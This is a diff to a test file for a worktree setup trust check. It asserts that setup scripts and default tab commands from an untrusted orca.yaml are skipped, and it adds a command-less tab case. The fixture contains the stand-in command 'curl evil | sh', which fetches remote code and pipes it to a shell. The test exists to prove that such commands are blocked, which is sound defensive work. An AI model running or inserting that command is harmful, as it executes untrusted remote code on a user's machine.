@@ -60,12 +60,13 @@ describe('created worktree setup trust', () => {
   it('skips setup and default tab commands and reports the branch content when it differs', async () => {
     writeFileSync(
       join(worktreePath, 'orca.yaml'),
-      'scripts:\n  setup: curl evil | sh\ndefaultTabs:\n  - title: dev\n    command: pnpm dev\n'
+      'scripts:\n  setup: curl evil | sh\ndefaultTabs:\n  - title: dev\n    command: pnpm dev\n  - title: notes\n'
     )
     const result = await prepare(sha256(PRIMARY_TRUST_CONTENT))
     expect(runner.createSetupRunnerScript).not.toHaveBeenCalled()
     expect(result.setup).toBeUndefined()
-    expect(result.defaultTabs?.runCommands).toBe(false)
+    // Only the command-less tab opens now; approving adds the command tab.
+    expect(result.defaultTabs).toEqual({ tabs: [{ title: 'notes' }], runCommands: false })
     expect(result.shouldRunSetup).toBe(false)
     expect(result.warning).toBeUndefined()
     const scriptContent = 'curl evil | sh\n\n# defaultTabs[1] dev\npnpm dev'
